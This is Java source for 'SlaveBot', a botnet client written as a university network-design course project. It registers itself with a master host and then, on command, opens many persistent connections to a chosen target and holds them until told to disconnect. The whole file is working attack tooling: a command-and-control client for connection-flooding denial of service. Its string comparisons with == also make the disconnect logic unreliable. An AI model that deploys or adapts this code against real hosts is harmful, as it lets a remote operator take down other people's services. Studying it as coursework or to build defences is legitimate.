/*
@author Vishal Govindraddi Yarabandi
        CMPE-206-Network Design Course Project under Dr.Juan Gomez
        San Jose State University
        SlaveBot

@usage java SlaveBot -h <Master-HostNameOrIP> -p <Port>

*/

import java.net.*;
import java.io.*;
import java.lang.*;
import java.util.*;
import java.text.SimpleDateFormat;

class Connect implements Runnable { //Class to connect to Target Host-Multithreaded
    public static String disconnectIP = "";
    public static String disconnectPort = "";
    private Thread th;
    private String threadName;
    public String HostIP;
    public Integer HostPort;
    int i = 0;

    Connect(int n, String targetHost, String Port) {
        i = 1;
        threadName = "slaveAttackerThread_" + Integer.toString(n);
        HostIP = targetHost;
        HostPort = Integer.parseInt(Port);
        disconnectIP = "";
        disconnectPort = "";
    }

    public static void setDisconnectParameters(String IP, String Port) { //Set disconnect IP and port
        disconnectIP = IP;
        disconnectPort = Port;
        for(int i = 0; i < 1000; i++); //Kill time - for thread synchronisation
    }

    @Override
    public void run() {   
        String targetIP = HostIP;
        Integer targetPort = HostPort;
        String thread_name = threadName;

        try {
            InetAddress address = null;
            try {
                address = InetAddress.getByName(targetIP);
            } 
            catch (UnknownHostException ex) {
                System.out.println(ex.getMessage());
            }

            Socket attackerSock;
            try {
                attackerSock = new Socket(address, targetPort); 
            }
            catch(IOException ioe) {
                attackerSock = new Socket(targetIP, targetPort); 
            }
                
            boolean stayConnected = true;
            
            String disconnectIP1;
            String disconnectPort1;

            while(stayConnected) {
                disconnectIP1 = disconnectIP;            //Using copies for thread safety
                disconnectPort1 = disconnectPort;
                InetAddress disAddr = null;
                Integer disPort;

                try {
                    disAddr = InetAddress.getByName(disconnectIP1);
                } 
                catch (UnknownHostException ex) {
                    System.out.println(ex.getMessage());
                }

                if ("all".equals(disconnectPort1)) {
                    disPort = targetPort;
                }
                else {
                    disPort = Integer.parseInt(disconnectPort1);
                }

                stayConnected = !(((address == disAddr)||("all".equals(disconnectIP1)))&&(disPort == targetPort));
            } //continue if disconnect IP and Port are not the same as current thread's target IP and Port
            attackerSock.close();
        }
        catch(IOException ex) { 
            System.err.println("Run: " + ex.getMessage());
            System.exit(-1);
        }
    }

    public void start() {
        if (th == null) {
            th = new Thread(this,threadName);
            th.start();
        }
    }
}

public class SlaveBot { 
    public static int numberOfConnections;
    public static String[] IPs = new String[50];
    public static String[] Ports = new String[50];
    public static int[] k = new int[50];
    public static Integer counter = 0;

    public static void connectToTargetHost(String targetIP, String targetPort, String connections) {
        int connectionCount = Integer.parseInt(connections);
        int j;
        for(j = 0; j < counter + 1; j++) {
            if (((IPs[j] == targetIP)||(IPs[j]==null))&&((Ports[j] == targetPort)||(targetPort == "all")||(Ports[j] == null))) {
                break;   //gottcha
            }
        }
        for (int i = 0; i < connectionCount; i++) { //Create a thread for every new connection
            numberOfConnections++;
            Connect connection = new Connect(numberOfConnections, targetIP, targetPort);
            connection.setDisconnectParameters(" ","0");
            connection.start();
            k[j] = k[j] + 1;
        }
        if(IPs[j] == null)
            counter++;

        IPs[j] = targetIP;
        Ports[j] = targetPort;
    }

    public static void disconnectFromTargetHost(String targetIP, String targetPort) {
        Connect.setDisconnectParameters(targetIP, targetPort); //set disconnect parameters
        int j;
        for(j = 0; j < counter + 1; j++) {   //Delete disconnected IP from list
            if ((IPs[j] == targetIP)||(IPs[j] == null) && (Ports[j] == targetPort)||(targetPort == "all")||(Ports[j] == null)) {
                break;
            }
        }
        k[j] = 0;
    }

    public static void register(String[] args, int Port) { //Register with master
        try {
            InetAddress address = InetAddress.getLocalHost();
            String selfHostIP = address.getHostAddress();
            String selfHostName = address.getHostName();

            Socket masterSock = new Socket(args[1], Integer.parseInt(args[3]));				    
            PrintWriter  masterOutStream = new PrintWriter(masterSock.getOutputStream(),true);

            String timeStamp = new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime());
            masterOutStream.println(selfHostName + " " + selfHostIP + " " + Integer.toString(Port) + " " + timeStamp);

            masterSock.close();
        }
        catch(IOException ex) {
            System.err.println("Could not register with master!  " + ex.getMessage());
            System.exit(-1);
        }
    }

    public static void main(String[] args) {   
        if (args.length != 4) {    //check if -h MasterBot-IP -p port is given
            System.exit(-1);
        }

        int listenerPort;
        Random rand = new Random();                          //select a random port number for slave to listen for master commands
        listenerPort = rand.nextInt((65535 - 49152) + 1) + 49152;

        register(args, listenerPort);                   //register self with Master

        try( ServerSocket slave = new ServerSocket(listenerPort);) {
            while(true) {          //listen for connection from master
                Socket masterCon = slave.accept();
                try {
    		    InputStream cmdIn = masterCon.getInputStream(); // create object to get input through socket
                    BufferedReader br = new BufferedReader(new InputStreamReader(cmdIn));  //stores input until master closes the connection
                    String line = br.readLine();
                    String[] cmd = line.split("\\s+");

                    if("connect".equals(cmd[0])) {
                        connectToTargetHost(cmd[1], cmd[2], cmd[3]);
                    }
                    if("disconnect".equals(cmd[0])) {
                        disconnectFromTargetHost(cmd[1], cmd[2]);
                    }
                }
                catch(IOException ex) {
                    System.err.println("Main-while: " + ex.getMessage());
                    System.exit(-1);
                }
                masterCon.close();
            }
        } 
        catch (IOException ex) {
            System.err.println("Main: " + ex.getMessage());
            System.exit(-1);
        }
    }
}
